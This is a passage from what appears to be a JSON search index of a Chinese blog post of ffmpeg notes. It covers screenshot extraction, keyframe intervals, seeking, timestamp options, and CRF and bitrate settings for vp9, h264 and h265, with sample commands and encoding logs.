crf\uff0c\u770b\u770b\u64ad\u653e\u6548\u679c\u3002\u7801\u7387\u6700\u597d\u4e0d\u8981\u8d85\u8fc7 25Mbps\uff0c\u5e73\u5747\u63a7\u5236\u5728 10Mbps \u5de6\u53f3\u3002</p> <p>h264 \u5e76\u4e0d\u652f\u6301 crf \u6a21\u5f0f\u4e0b\u8bbe\u7f6e\u6700\u5927\u5cf0\u503c\u7801\u7387video encoding - Using CRF and setting a maximum bitrate with x264 in FFmpeg - Super User</p> <ul> <li>\u8981\u4e48\u4f7f\u7528 two pass mode</li> <li>\u8981\u4e48\u6362 av1 \u7b49\u66f4\u9ad8\u7ea7\u7684\u7f16\u7801</li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u67e5\u770b\u6587\u4ef6\u5143\u4fe1\u606f","title":"\u67e5\u770b\u6587\u4ef6\u5143\u4fe1\u606f","text":"<pre><code>ffmpeg -i input.mp4 -hide_banner\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u63d0\u53d6\u97f3\u9891","title":"\u63d0\u53d6\u97f3\u9891","text":"<p>\u8f93\u51fa\u6587\u4ef6\u53ef\u4ee5\u9009\u62e9\u4e0d\u540c\u5bb9\u5668\u683c\u5f0f\uff0c\u6839\u636e\u97f3\u9891\u7f16\u7801\u9009\u62e9\u3002\uff08\u5982 m4a, mp3\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528 mkv \u5b58\u50a8\uff09</p> <pre><code>ffmpeg -i input.mp4 -vn -c:a copy output.aac\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u622a\u56fe","title":"\u622a\u56fe","text":"<pre><code>ffmpeg -i input.mp4 -ss 00:01:24 -t 00:00:01 output_%3d.png\n</code></pre> <p>JPG \u548c PNG</p> <p>jpg \u662f\u6709\u635f\u538b\u7f29\uff0cpng \u662f\u65e0\u635f\u538b\u7f29\u3002 \u751f\u6210 jpg \u65f6\u53ef\u4ee5\u6307\u5b9a\u7f16\u7801\u8d28\u91cf\u3002<code>-q:v 2</code>\u8868\u793a\u8f93\u51fa\u7684 jpg \u56fe\u7247\u8d28\u91cf\uff0c\u4e00\u822c\u662f 1 \u5230 5 \u4e4b\u95f4\uff081 \u4e3a\u8d28\u91cf\u6700\u9ad8\uff09\u3002</p> <pre><code>ffmpeg -ss 01:23:45 -i input -vframes 1 -q:v 2 output.jpg\n</code></pre> <p>\u5e27\u7387\u63a7\u5236 (<code>-r</code>)</p> <p>\u8868\u793a\u6bcf\u79d2\u63d0\u53d6\u4e00\u5e27\u56fe\u7247</p> <pre><code>ffmpeg -i input.mp4 -r 1 output_%03d.png\n</code></pre> <p>\u5e27\u6570\u9650\u5236 (<code>-frames:v</code>)</p> <p><code>-vframes 1</code>\u6307\u5b9a\u53ea\u622a\u53d6\u4e00\u5e27</p> <pre><code>ffmpeg -ss 01:23:45 -i input -vframes 1 -q:v 2 output.jpg\n</code></pre> <p>\u9009\u62e9\u5e27 (<code>-vf select</code>)</p> <p>\u6bcf 10 \u5e27\u63d0\u53d6\u4e00\u5f20\u56fe\u7247</p> <pre><code>ffmpeg -i input.mp4 -vf \"select=not(mod(n\\,10))\" -vsync vfr output_%03d.png\n</code></pre> <p>\u8fc7\u6ee4\u5668\u540e\u5904\u7406</p> <pre><code>ffmpeg -i input.mp4 -vf \"crop=640:360:0:0\" output_%03d.png  # \u88c1\u526a\u56fe\u7247\uff0c640x360 \u4ece\u5de6\u4e0a\u89d2\u622a\u53d6\uff08\u4e0d\u6307\u5b9a\u65f6\u5c45\u4e2d\u622a\u53d6\uff09\n\nffmpeg -i input.mp4 -vf \"scale=640:360\" output_%03d.png   # \u5c06\u8f93\u51fa\u56fe\u7247\u8c03\u6574\u4e3a 640x360 \u5206\u8fa8\u7387\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u4e32\u6d41\u4f18\u5316","title":"\u4e32\u6d41\u4f18\u5316","text":"<p>[\u8bd1] \u4f18\u5316 MP4 \u89c6\u9891\u4ee5\u83b7\u5f97\u66f4\u5feb\u7684\u6d41\u4f20\u8f93\u901f\u5ea6 - \u6398\u91d1 (juejin.cn)</p> <pre><code>-movflags faststart -g 50 -sc_threshold 0\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#faststart","title":"faststart","text":"<ul> <li>Handbrake\u00a0\u7684\u00a0\u201cWeb Optimized\u201d\u00a0\u9009\u9879</li> </ul> <pre><code>-movflags faststart\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#keyframe","title":"keyframe","text":"<p>ffmpeg - Checking keyframe interval? - Stack Overflow</p> <pre><code>ffprobe -loglevel error -select_streams v:0 -show_entries packet=pts_time,flags -of csv=print_section=0 input.mp4 | awk -F',' '/K/ {print $1}'\n</code></pre> <pre><code>0.000000\n2.933333\n11.266667\n14.233333\n22.400000\n30.733333\n37.133333\n43.266667\n45.633333\n53.966667\n62.300000\n</code></pre> <pre><code>ffmpeg -i YOUR_INPUT -c:v h264 -keyint_min 25 -g 50 -sc_threshold 0 OUTPUT.mp4\n</code></pre> <ul> <li><code>-keyint_min</code>: specifies the minimum interval to set a keyrame.</li> <li><code>-g 50</code>: this option stands for \"Group of Pictures\" and will instruct FFMPEG to sets the maximum keyframe interval every 50 frames, or 2 seconds, assuming that your input runs at 25 FPS.</li> <li><code>-sc_threshold 0</code>: This \"SC\" stands for Scene Change. FFmpeg defaults to a keyframe interval of 250 frames and inserts keyframes at scene changes, meaning when a picture's content change. This option will make sure not to add any new keyframe at scene changes.</li> </ul> <p>The reason why a short keyframe interval is very important is because we need to provide the end user with a fast experience during playback or seeking (fast forward or rewind) a video, especially for the Adaptive Bitrate case scenario, where the end user automatically receives the highest or the lowest quality, based on his own available bandwidth. Also, a player can not start playback on a pframe or b-frame.</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<p>FFmpeg Formats Documentation -fflags\u00a0flags \u662f\u53e6\u5916\u7684\u9009\u9879</p> <ul> <li>\u2018genpts\u2019\uff1aGenerate missing PTS if DTS is present.</li> </ul> <p>video - Does PTS have to start at 0? - Stack Overflow</p> <ul> <li>\u60f3\u8ba9 start_pts \u5305\u542b\u5b9e\u9645\u65f6\u95f4\u4fe1\u606f</li> </ul> <p>video - ffmpeg setpts apply uniform offset without re-encoding - Stack Overflow</p> <ul> <li>\u4e24\u4e2a\u6d41\uff0c\u77e5\u9053\u7ed3\u5c3e\uff0c\u56e0\u6b64\u53ef\u4ee5\u540c\u6b65</li> <li>\u4f7f\u7528 setpts filter \u53ef\u4ee5\u505a\u5230\uff0c\u4f46\u662f\u60f3\u8981\u907f\u514d\u8f6c\u7801</li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u622a\u53d6-seeking-\u4f4d\u7f6e","title":"\u622a\u53d6 Seeking \u4f4d\u7f6e","text":"<p>\u4e00\u5b9a\u8981\u8bfb\uff1aSeeking \u2013 FFmpeg</p> <p>\u5173\u952e\u5e27\uff08Keyframes\uff09\uff1a\u5728\u89c6\u9891\u7f16\u7801\u4e2d\uff0c\u5173\u952e\u5e27\u662f\u89c6\u9891\u5e8f\u5217\u4e2d\u7684\u7279\u6b8a\u5e27\uff0c\u5b83\u4eec\u662f\u72ec\u7acb\u7684\u3001\u4e0d\u4f9d\u8d56\u4e8e\u5176\u4ed6\u5e27\u7684\u5e27\u3002\u5173\u952e\u5e27\u5305\u542b\u5b8c\u6574\u7684\u56fe\u50cf\u4fe1\u606f\uff0c\u800c\u5176\u4ed6\u5e27\uff08\u5982 P \u5e27\u548c B \u5e27\uff09\u5219\u5229\u7528\u5173\u952e\u5e27\u548c/\u6216\u5176\u4ed6\u5e27\u7684\u4fe1\u606f\u8fdb\u884c\u538b\u7f29\u3002 \u5173\u952e\u5e27\u662f\u89c6\u9891\u4e2d\u7684\u91cd\u8981\u53c2\u8003\u70b9\uff0c\u5b83\u4eec\u901a\u5e38\u51fa\u73b0\u5728\u89c6\u9891\u573a\u666f\u53d8\u5316\u6216\u8fd0\u52a8\u53d1\u751f\u7684\u5730\u65b9\u3002\u7531\u4e8e\u5173\u952e\u5e27\u662f\u72ec\u7acb\u7684\uff0c\u89c6\u9891\u64ad\u653e\u5668\u6216\u89e3\u7801\u5668\u53ef\u4ee5\u5728\u4efb\u4f55\u5173\u952e\u5e27\u5904\u5f00\u59cb\u89e3\u7801\uff0c\u800c\u4e0d\u9700\u8981\u4f9d\u8d56\u4e4b\u524d\u7684\u5e27\u3002\u8fd9\u6709\u52a9\u4e8e\u5feb\u901f\u5b9a\u4f4d\u548c\u968f\u673a\u8bbf\u95ee\u89c6\u9891\u3002</p> <p>PTS\uff08Presentation Timestamp\uff09\uff1a PTS \u662f\u4e00\u4e2a\u65f6\u95f4\u6233\uff0c\u8868\u793a\u89c6\u9891\u6216\u97f3\u9891\u5e27\u5728\u64ad\u653e\u65f6\u5e94\u8be5\u5448\u73b0\u7684\u65f6\u95f4\u3002PTS \u7528\u4e8e\u786e\u5b9a\u5e27\u4f55\u65f6\u5e94\u8be5\u5728\u64ad\u653e\u65f6\u95f4\u8f74\u4e0a\u663e\u793a\u6216\u64ad\u653e\u3002</p> <p>GOP\uff08Group of Pictures\uff09\uff1aGOP \u662f\u89c6\u9891\u5e8f\u5217\u4e2d\u7684\u4e00\u7ec4\u5e27\uff0c\u5b83\u5305\u542b\u4e00\u4e2a\u5173\u952e\u5e27\uff08I \u5e27\uff09\u548c\u4e00\u4e9b\u540e\u7eed\u5e27\uff0c\u5305\u62ec\u9884\u6d4b\u5e27\uff08P \u5e27\uff09\u548c\u53cc\u5411\u9884\u6d4b\u5e27\uff08B \u5e27\uff09\u3002GOP \u7684\u7ed3\u6784\u6709\u52a9\u4e8e\u89c6\u9891\u538b\u7f29\u548c\u89e3\u7801\u3002 \u5178\u578b\u7684 GOP \u7ed3\u6784\u53ef\u80fd\u662f\"IBBPBBPBBPBB\"\uff0c\u5176\u4e2d\"I\"\u662f\u5173\u952e\u5e27\uff0c\"B\"\u662f\u53cc\u5411\u9884\u6d4b\u5e27\uff0c\"P\"\u662f\u9884\u6d4b\u5e27\u3002\u5173\u952e\u5e27\u59cb\u7ec8\u662f GOP \u7684\u7b2c\u4e00\u4e2a\u5e27\u3002</p> <p>\u5173\u952e\u5e27\u548c GOP \u7684\u5173\u7cfb\uff1a \u5173\u952e\u5e27\u662f GOP \u7684\u8d77\u70b9\uff0c\u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b0\u7684\u7f16\u7801\u7ec4\uff0c\u5176\u540e\u8ddf\u968f\u4e00\u7cfb\u5217\u4f9d\u8d56\u4e8e\u5b83\u7684\u9884\u6d4b\u5e27\u548c\u53cc\u5411\u9884\u6d4b\u5e27\u3002\u6574\u4e2a GOP \u7684\u7ed3\u6784\u6709\u52a9\u4e8e\u5728\u89c6\u9891\u7f16\u7801\u4e2d\u5b9e\u73b0\u9ad8\u538b\u7f29\u6bd4\uff0c\u56e0\u4e3a\u9884\u6d4b\u5e27\u548c\u53cc\u5411\u9884\u6d4b\u5e27\u53ef\u4ee5\u5229\u7528\u5173\u952e\u5e27\u7684\u4fe1\u606f\u8fdb\u884c\u5dee\u5f02\u7f16\u7801\uff0c\u800c\u4e0d\u5fc5\u643a\u5e26\u5b8c\u6574\u7684\u56fe\u50cf\u4fe1\u606f\u3002 \u5728\u89c6\u9891\u6d41\u4e2d\uff0c\u5173\u952e\u5e27\u7684\u9009\u62e9\u548c GOP \u7684\u8bbe\u7f6e\u5bf9\u4e8e\u89c6\u9891\u7684\u8d28\u91cf\u3001\u538b\u7f29\u6548\u7387\u548c\u5feb\u901f\u5b9a\u4f4d\u80fd\u529b\u90fd\u5177\u6709\u91cd\u8981\u5f71\u54cd\u3002\u4e0d\u540c\u7684\u5e94\u7528\u548c\u4f7f\u7528\u573a\u666f\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u5173\u952e\u5e27\u95f4\u9694\u548c GOP \u7ed3\u6784\u6765\u5e73\u8861\u538b\u7f29\u6548\u7387\u548c\u89e3\u7801\u6027\u80fd\u3002</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u67e5\u770b\u5173\u952e\u5e27\u65b9\u6cd5","title":"\u67e5\u770b\u5173\u952e\u5e27\u65b9\u6cd5","text":"<pre><code>ffprobe -select_streams v -show_frames -show_entries frame=pict_type,pkt_pts_time bbb_sunflower_1080p_30fps_normal.mp4 &gt; log\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#input-seeking","title":"input seeking","text":"<p>-ss \u00a0position\u00a0(input/output)</p> <p>When used as an input option (before\u00a0<code>-i</code>), seeks in this input file to\u00a0position. Note that in most formats it is not possible to seek exactly, so\u00a0<code>ffmpeg</code>\u00a0will seek to the closest seek point before\u00a0position.</p> <ul> <li>\u7b80\u5355\u7406\u89e3\u4e3a seek \u5230 I \u5e27\u3002</li> <li>\u8f6c\u7801\u65f6\uff1aWhen transcoding and\u00a0-accurate_seek\u00a0is enabled (the default), this extra segment between the seek point and\u00a0position\u00a0will be decoded and discarded</li> <li>copy \u65f6\uff1aWhen doing stream copy or when\u00a0-noaccurate_seek\u00a0is used, it will be preserved.<ul> <li>\u7531\u4e8e\u4e0d\u80fd\u7f16\u89e3\u7801\uff0c\u6240\u4ee5\u5b9e\u9645 seek \u4f4d\u7f6e\u5fc5\u987b\u5bf9\u5e94 I \u5e27\uff0c\u56e0\u6b64 seek \u4f4d\u7f6e\u5b9e\u9645\u5728 pos \u6700\u524d\u7684\u4e00\u4e2a I \u5e27\uff0c\u7136\u540e\u5c06 ts \u7f6e\u4e3a 0\uff1f</li> </ul> </li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5b9e\u9a8c","title":"\u5b9e\u9a8c","text":"<pre><code>ffmpeg -i bbb_sunflower_1080p_30fps_normal.mkv -t 10 ref/ref_%04d.png\n\nf421d45d1b8b491dc36a564c01246ef8  i_ss_2-noacc.png\n468a10a80c838526709d4d35abe7af3a  i_ss_2.png\n\n(base) fyyuan@icarus4 \u279c  test cat ref/log2|grep f421d45d1b8b491dc36a564c01246ef8\nf421d45d1b8b491dc36a564c01246ef8  ref_0061.png\n(base) fyyuan@icarus4 \u279c  test cat ref/log2|grep 468a10a80c838526709d4d35abe7af3a\n468a10a80c838526709d4d35abe7af3a  ref_0059.png\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#output-seeking","title":"output seeking","text":"<p>When used as an output option (before an output url), decodes but discards input until the timestamps reach\u00a0position.</p> <ul> <li>\u7531\u4e8e input \u5df2\u7ecf\u88ab\u89e3\u7801\u4e86\uff0c\u56e0\u6b64\u6bcf\u5e27\u7684 timestamp \u53ef\u4ee5\u83b7\u5f97\uff0cseek \u5230\u6307\u5b9a\u4f4d\u7f6e\u524d\u7684 frame\u3002</li> <li>Here, the input will be decoded (and discarded) until it reaches the position given by\u00a0<code>-ss</code>. This will be done\u00a0very slowly, frame by frame.</li> <li>As of FFmpeg 2.1, the main advantage is that when applying filters to the output stream, the timestamps aren't reset prior to filtering (i.e. when\u00a0\u200bburning subtitles into a video, you don't need to modify the subtitle timestamps),</li> </ul> <pre><code>ffprobe -select_streams v -show_frames -show_entries frame=pict_type,pkt_pts_time src.mkv\n</code></pre> <pre><code>[FRAME]\npkt_pts_time=0.613000\npict_type=I\n[/FRAME]\n[FRAME]\npkt_pts_time=0.630000\npict_type=B\n[/FRAME]\n...\n[FRAME]\npkt_pts_time=1.130000\npict_type=B\n[/FRAME]\n[FRAME]\npkt_pts_time=1.147000\npict_type=I\n[/FRAME]\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u76f8\u5173\u9009\u9879","title":"\u76f8\u5173\u9009\u9879","text":"<p>-copyts</p> <p>Do not process input timestamps, but keep their values without trying to sanitize them. In particular, do not remove the initial start time offset value. Note that, depending on the\u00a0vsync\u00a0option or on specific muxer processing (e.g. in case the format option\u00a0avoid_negative_ts\u00a0is enabled) the output timestamps may mismatch with the input timestamps even when this option is selected.</p> <p>-start_at_zero</p> <p>When used with\u00a0copyts, shift input timestamps so they start at zero. This means that using e.g.\u00a0<code>-ss 50</code>\u00a0will make output timestamps start at 50 seconds, regardless of what timestamp the input file started at.</p> <p>-avoid_negative_ts\u00a0integer\u00a0(output)</p> <p>Possible values: \u2018make_non_negative\u2019 Shift timestamps to make them non-negative. Also note that this affects only leading negative timestamps, and not non-monotonic negative timestamps.</p> <p>\u2018make_zero\u2019 Shift timestamps so that the first timestamp is 0.</p> <p>\u2018auto (default)\u2019 Enables shifting when required by the target format.</p> <p>\u2018disabled\u2019 Disables shifting of timestamp.</p> <p>When shifting is enabled, all output timestamps are shifted by the same amount. Audio, video, and subtitles desynching and relative timestamp differences are preserved compared to how they would have been without shifting.</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u8f6c\u7801","title":"\u8f6c\u7801","text":"","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u50cf\u7d20\u683c\u5f0f","title":"\u50cf\u7d20\u683c\u5f0f","text":"<pre><code>Encoder h264_nvenc [NVIDIA NVENC H.264 encoder]:\n    General capabilities: dr1 delay hardware\n    Threading capabilities: none\n    Supported hardware devices: cuda cuda\n    Supported pixel formats: yuv420p nv12 p010le yuv444p p016le yuv444p16le bgr0 rgb0 cuda\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#crf-vs-\u56fa\u5b9a\u7801\u7387\u7b49\u6a21\u5f0f","title":"CRF vs \u56fa\u5b9a\u7801\u7387\u7b49\u6a21\u5f0f","text":"<p>A change of \u00b16 should result in about half/double the file size You should use CRF encoding primarly for offline file storage, in order to achieve the most optimal encodes</p> <p>For x264, sane values are between 18 and 28. The default is 23 For x265, the default CRF is 28</p> <ul> <li>Constant Quality: ensure that every frame gets the number of bits it deserves to achieve a certain (perceptual) quality level<ul> <li>h264, h265: <code>-crf</code></li> </ul> </li> <li>Average Bitrate (ABR): Target Bitrate mode, try to reach the specified bit rate on average<ul> <li><code>-b:v 2M</code></li> </ul> </li> <li>Two pass<ul> <li>\u7528\u4e8e\u8fbe\u5230\u76ee\u6807\u7801\u7387</li> <li> </li> </ul> </li> </ul> <p>CRF VBR CBR</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5373\u4f7f\u6ca1\u6709\u6307\u5b9a\u76ee\u6807\u7801\u7387\u5bf9\u4e8e-crf-\u4ecd\u7136\u662f\u6709\u5e2e\u52a9\u7684","title":"\u5373\u4f7f\u6ca1\u6709\u6307\u5b9a\u76ee\u6807\u7801\u7387\uff0c\u5bf9\u4e8e CRF \u4ecd\u7136\u662f\u6709\u5e2e\u52a9\u7684","text":"","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#vp9","title":"vp9","text":"<p>vbr</p> <ul> <li>1-pass average bitrate</li> <li>2-pass average bitrate<ul> <li>Two-pass is the recommended encoding method for libvpx-vp9 as some quality-enhancing encoder features are only available in 2-pass mode.</li> </ul> </li> <li>Constant quality (Constant quantizer)</li> <li>2-pass constant quality</li> <li>Constant bitrate</li> </ul> <p>2-pass \u6a21\u5f0f</p> <p>Constant quality 2-pass is invoked by setting\u00a0<code>-b:v</code>\u00a0to zero and specifiying a quality level using the\u00a0<code>-crf</code>\u00a0switch:</p> <pre><code>input=\noutput=\ncrf=30\nffmpeg -i \"$(input)\" -c:v libvpx-vp9 -b:v 0 -crf $crf -pass 1 -an -f null /dev/null &amp;&amp; \\\nffmpeg -i \"$(input)\" -c:v libvpx-vp9 -b:v 0 -crf $crf -pass 2 -c:a copy $output\n</code></pre> <pre><code>ffmpeg -i input.mp4 -c:v libvpx-vp9 -crf 30 -b:v 0 output.webm\n</code></pre> <p>\u975e\u5e38\u6162\uff0c\u4f53\u9a8c\u5f88\u5dee</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#h264","title":"h264","text":"<p>Encode/H.264 \u2013 FFmpeg</p> <p>\u4e24\u79cd\u6a21\u5f0f</p> <ul> <li>CRF\uff1a\u4e0d\u5173\u5fc3\u6587\u4ef6\u5927\u5c0f<ul> <li>17\u201328</li> <li>\u9ed8\u8ba4 23</li> <li>\u76f8\u5dee6 \u7801\u7387\u5dee\u4e00\u500d</li> </ul> </li> <li>2pass: \u5bf9\u6587\u4ef6\u5927\u5c0f\u6709\u8981\u6c42\u7684\u573a\u666f\uff0c\u6bd4\u5982 streaming</li> </ul> <pre><code>ffmpeg -i input -c:v libx264 -preset medium -crf 23 -c:a copy output.mkv\n</code></pre> <p>preset</p> <ul> <li><code>ultrafast</code></li> <li><code>superfast</code></li> <li><code>veryfast</code></li> <li><code>faster</code></li> <li><code>fast</code></li> <li><code>medium</code>\u00a0\u2013 default preset</li> <li><code>slow</code></li> <li><code>slower</code></li> <li><code>veryslow</code></li> <li><code>placebo</code>\u00a0\u2013 ignore this as it is not useful (see\u00a0FAQ)</li> </ul> <p>tune</p> <ul> <li><code>film</code>\u00a0\u2013 use for high quality movie content; lowers deblocking</li> <li><code>animation</code>\u00a0\u2013 good for cartoons; uses higher deblocking and more reference frames</li> <li><code>grain</code>\u00a0\u2013 preserves the grain structure in old, grainy film material</li> <li><code>stillimage</code>\u00a0\u2013 good for slideshow-like content</li> <li><code>fastdecode</code>\u00a0\u2013 allows faster decoding by disabling certain filters</li> <li><code>zerolatency</code>\u00a0\u2013 good for fast encoding and low-latency streaming</li> <li><code>psnr</code>\u00a0\u2013 ignore this as it is only used for codec development</li> <li><code>ssim</code>\u00a0\u2013 ignore this as it is only used for codec development</li> </ul> <p>profile\uff1a\u975e\u5e38\u8001\u7684\u8bbe\u5907\u652f\u6301 main \u4ee5\u4e0b\u3002\u901a\u5e38\u652f\u6301 main \u548c high</p> <ul> <li><code>baseline</code></li> <li><code>main</code></li> <li><code>high</code></li> <li><code>high10</code>\u00a0(first 10 bit compatible profile)</li> <li><code>high422</code>\u00a0(supports yuv420p, yuv422p, yuv420p10le and yuv422p10le)</li> <li><code>high444</code>\u00a0(supports as above as well as yuv444p and yuv444p10le)</li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#constrained-encoding-vbv--maximum-bit-rate","title":"Constrained encoding (VBV / maximum bit rate)","text":"<p>You can use\u00a0<code>-crf</code>\u00a0or\u00a0<code>-b:v</code>\u00a0with a maximum bit rate by specifying both\u00a0<code>-maxrate</code>\u00a0and\u00a0<code>-bufsize</code>:</p> <pre><code>ffmpeg -i input -c:v libx264 -crf 23 -maxrate 1M -bufsize 2M output.mp4\n</code></pre> <p><code>-bufsize</code>\u00a0is the \"rate control buffer\", so it will enforce your requested \"average\" (1 MBit/s in this case) across each 2 MBit worth of video.</p> <p>This will effectively \"target\"\u00a0<code>-crf 23</code>, but if the output were to exceed 1 MBit/s, the encoder would increase the CRF to prevent bitrate spikes. However, be aware that\u00a0<code>libx264</code>\u00a0does not strictly control the maximum bit rate as you specified (the maximum bit rate may be well over 1M for the above file). To reach a perfect maximum bit rate, use two-pass.</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#h265","title":"h265","text":"<p>Encode/H.265 \u2013 FFmpeg</p> <ul> <li>Choose a CRF. CRF affects the quality. The default is 28, and it should visually correspond to libx264 video at CRF 23, but result in about half the file size. CRF works just like in x264, so choose the highest value that provides an acceptable quality.</li> </ul> <ul> <li>Choose a preset. The default is <code>medium</code>. The preset determines compression efficiency and therefore affects encoding speed. Valid presets are <code>ultrafast</code>, <code>superfast</code>, <code>veryfast</code>, <code>faster</code>, <code>fast</code>, <code>medium</code>, <code>slow</code>, <code>slower</code>, <code>veryslow</code>, and <code>placebo</code>. Use the slowest preset you have patience for. Ignore <code>placebo</code> as it provides insignificant returns for a significant increase in encoding time.</li> </ul> <ul> <li>Choose a tune (optional). By default, this is disabled, and it is generally not required to set a tune option. x265 supports the following <code>-tune</code> options: <code>psnr</code>, <code>ssim</code>, <code>grain</code>, <code>zerolatency</code>, <code>fastdecode</code>. They are explained in the H.264 guide.</li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#crf\u7801\u7387\u9009\u62e9","title":"crf/\u7801\u7387\u9009\u62e9","text":"<ul> <li>\u8f6c\u7801 4K \u65f6 crf \u4e00\u5b9a\u8981\u9009\u597d\uff0c\u9ed8\u8ba4\u7684\u7801\u7387\u662f\u5f88\u4f4e\u7684 h265<ul> <li>crf 26: 11mbps\uff08B \u7ad9\u8f6c\u6210 h264 \u5c31\u5269 10mb \u4e86\uff0c\u4f46\u5b9e\u9645\u6700\u9ad8\u53ef\u8fbe 18mb\uff09</li> <li>crf 20: 22281kb</li> <li>crf 16: 34894kb</li> </ul> </li> </ul> <p>\u5b9e\u6d4b\uff1a</p> <p>\u76f4\u63a5\u8f6c\u7801\uff0c\u4ecd\u4f7f\u7528\u4e86\u539f\u672c\u7684 59.94fps</p> <pre><code>ffmpeg -i INPUT -c:v libx265 -crf 26 -preset slow -c:a aac -b:a 320k OUTPUT\n\nframe=31195 fps= 12 q=35.8 Lsize=  709168kB time=00:08:41.00 bitrate=11150.6kbits/s speed=0.195x\nvideo:688379kB audio:20388kB subtitle:0kB other streams:0kB global headers:2kB muxing overhead: 0.056575%\nx265 [info]: frame I:    132, Avg QP:27.54  kb/s: 60301.51\nx265 [info]: frame P:   7805, Avg QP:29.13  kb/s: 28855.09\nx265 [info]: frame B:  23258, Avg QP:34.69  kb/s: 4505.13\nx265 [info]: Weighted P-Frames: Y:1.7% UV:1.4%\nx265 [info]: consecutive B-frames: 1.0% 2.5% 2.3% 91.0% 3.3%\n\nencoded 31195 frames in 2677.46s (11.65 fps), 10833.60 kb/s, Avg QP:33.27\n[aac @ 0x55d67964f4c0] Qavg: 174.559\n</code></pre> <p>\u8bbe\u7f6e\u5e27\u7387 60fps</p> <pre><code>ffmpeg -i INPUT -c:v libx265 -crf 26 -preset slow -r 60 -c:a aac -b:a 320k OUTPUT\n\n\nframe=31195 fps=8.3 q=36.0 Lsize=  708843kB time=00:08:41.00 bitrate=11145.6kbits/s speed=0.139x\nvideo:688054kB audio:20388kB subtitle:0kB other streams:0kB global headers:2kB muxing overhead: 0.056600%\nx265 [info]: frame I:    132, Avg QP:27.54  kb/s: 60361.57\nx265 [info]: frame P:   7805, Avg QP:29.14  kb/s: 28870.71\nx265 [info]: frame B:  23258, Avg QP:34.70  kb/s: 4507.21\nx265 [info]: Weighted P-Frames: Y:1.7% UV:1.4%\nx265 [info]: consecutive B-frames: 1.0% 2.5% 2.3% 91.0% 3.3%\n\nencoded 31195 frames in 3751.69s (8.31 fps), 10839.31 kb/s, Avg QP:33.27\n[aac @ 0x56079a852080] Qavg: 174.559\n</code></pre> <p>6.x GB 2 \u5c0f\u65f6 h264 \u7535\u5f71\uff0c\u8f6c\u7801\u6210 h265 \u540e\uff0c1.6GB</p> <pre><code>video:1601155kB audio:98562kB subtitle:0kB other streams:0kB global headers:6kB muxing overhead: 0.310183%\nx265 [info]: frame I:   1140, Avg QP:23.90  kb/s: 9640.57\nx265 [info]: frame P:  85553, Avg QP:26.19  kb/s: 3183.49\nx265 [info]: frame B: 180658, Avg QP:32.30  kb/s: 606.13\nx265 [info]: Weighted P-Frames: Y:1.0% UV:0.5%\nx265 [info]: consecutive B-frames: 1.7% 1.5% 86.7% 6.7% 3.4%\n\nencoded 267351 frames in 11214.90s (23.84 fps), 1469.42 kb/s, Avg 